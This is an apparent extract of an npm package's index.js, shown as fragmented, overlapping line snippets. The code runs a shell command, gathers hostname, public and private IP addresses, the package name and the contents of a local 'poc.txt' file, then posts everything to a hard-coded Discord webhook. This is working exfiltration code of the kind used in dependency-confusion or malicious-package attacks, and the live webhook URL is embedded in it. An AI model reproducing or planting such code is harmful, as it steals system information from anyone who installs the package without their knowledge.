// File: tmp/tmpfpvhga_x/package/index.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const https = require('https')
Line 3: const fs = require('fs')
Line 4: const path = require('path')
Line 19: const webhookUrl = 'https://discord.com/api/webhooks/1282556604851421308/ULZN1VNiuQVpb3DRbQjd4o2awhpQ4cGq1VF9w_XuPPKtD9svB12SjfJmBZ_x-rtjgZwJ'
Line 25: {
    const postData = JSON.stringify({
        content: data
    });

    const url = new URL(webhookUrl);

    const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, (res) => {
        let response = '';
        res.on('data', (chunk) => {
            response += chunk;
        });
        res.on('end', () => {
            callback(null, response);
        });
    });

    req.on('error', (e) => {
        callback(`Error: ${e.message}`);
    });

    req.write(postData);
    req.end();
}
Line 43: const req = https.request(options, (res) => {
        let response = '';
        res.on('data', (chunk) => {
            response += chunk;
        });
        res.on('end', () => {
            callback(null, response);
        });
    })
Line 49: callback(null, response)
Line 54: callback(`Error: ${e.message}`)
Line 57: req.write(postData)
Line 58: req.end()
Line 64: fs.readFile(packageJsonPath, 'utf8', (err, data) => {
        if (err) {
            callback(`Error reading package.json: ${err.message}`);
            return;
        }

        try {
            const packageJson = JSON.parse(data);
            callback(null, packageJson.name);
        } catch (parseErr) {
            callback(`Error parsing package.json: ${parseErr.message}`);
        }
    })
Line 66: callback(`Error reading package.json: ${err.message}`)
Line 71: const packageJson = JSON.parse(data)
Line 72: callback(null, packageJson.name)
Line 74: callback(`Error parsing package.json: ${parseErr.message}`)
Line 81: fs.readFile('/tmp/balvant-chavda/poc.txt', 'utf8', (err, data) => {
        if (err) {
            callback(`Error reading file: ${err.message}`);
        } else {
            callback(null, data);
        }
    })
Line 83: callback(`Error reading file: ${err.message}`)
Line 85: callback(null, data)
Line 91: exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error(`Error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
    }

    // Read the content of the poc.txt file
    readPocFile((fileErr, fileContent) => {
        if (fileErr) {
            console.error(fileErr);
            return;
        }

        // Extract IPs from stdout
        const publicIPRegex = /https:\/\/ifconfig\.me\s*([\d\.]+).*?api\.ipify\.org\s*([\d\.]+).*?hostname -I\s*([\d\.]+)/s;
        const matches = stdout.match(publicIPRegex);
        const publicIP1 = matches ? matches[1] : 'N/A';
        const publicIP2 = matches ? matches[2] : 'N/A';
        const privateIP = matches ? matches[3] : 'N/A';

        // Get the package name from package.json
        getPackageName((nameErr, packageName) => {
            if (nameErr) {
                console.error(nameErr);
                return;
            }

            /...
Line 102: {
        if (fileErr) {
            console.error(fileErr);
            return;
        }

        // Extract IPs from stdout
        const publicIPRegex = /https:\/\/ifconfig\.me\s*([\d\.]+).*?api\.ipify\.org\s*([\d\.]+).*?hostname -I\s*([\d\.]+)/s;
        const matches = stdout.match(publicIPRegex);
        const publicIP1 = matches ? matches[1] : 'N/A';
        const publicIP2 = matches ? matches[2] : 'N/A';
        const privateIP = matches ? matches[3] : 'N/A';

        // Get the package name from package.json
        getPackageName((nameErr, packageName) => {
            if (nameErr) {
                console.error(nameErr);
                return;
            }

            // Prepare the final message with file content, working directory, and IPs
            let finalData = `
**Package Name:**
${packageName}

**System Information:**
${stdout}

**Public IP 1:** ${publicIP1}
**Public IP 2:** ${publicIP2}
**Private IP:** ${privateIP}

**File Content:**
${fileContent}
`;

   ...
Line 109: const publicIPRegex = /https:\/\/ifconfig\.me\s*([\d\.]+).*?api\.ipify\.org\s*([\d\.]+).*?hostname -I\s*([\d\.]+)/s
Line 111: const publicIP1 = matches ? matches[1] : 'N/A'
Line 112: const publicIP2 = matches ? matches[2] : 'N/A'
Line 113: const privateIP = matches ? matches[3] : 'N/A'
